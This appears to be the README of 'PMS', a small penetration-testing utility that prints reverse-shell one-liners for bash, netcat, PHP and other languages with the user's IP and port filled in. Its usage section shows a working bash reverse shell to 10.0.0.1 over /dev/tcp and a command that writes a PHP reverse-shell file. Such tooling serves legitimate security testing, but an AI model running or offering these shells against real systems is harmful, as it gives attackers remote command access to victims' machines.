# PMS
PMS - Print My Shell

PMS will help you get you revers shell filled with you IP and port number.\
It's contains [pentestmonkey revers shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) shells.

Configuration
----------------
In ```pms.conf``` file you can set your  ```ethernet_interface``` name, ```ip``` address or ```port``` number\
If your ```ip``` address is set in the conf file it won't use the ```ethernet_interface``` address\
You can specify your ```ip``` address or ```port``` number as an argument too.

Arguments
-----------------
```-t --type```: **required**, reverse shell type , (eg. "bash")\
```-c --config```: *optional* , configuration file , ```<default> pms.conf```\
```-i --ip```: *optional*, IP address\
```-p --port```: *optional* port number\

shell types : bash, perl, python, php (shell), ruby, nc, nc-2, java, php-rev (file)


Usage
----------------
```sh
$ python3 pms.py --type bash
bash -i >& /dev/tcp/10.0.0.1/1111 0>&1
```
Get php reverse shell file
```sh
$ python3 pms.py --type php-rev > shell.php
```
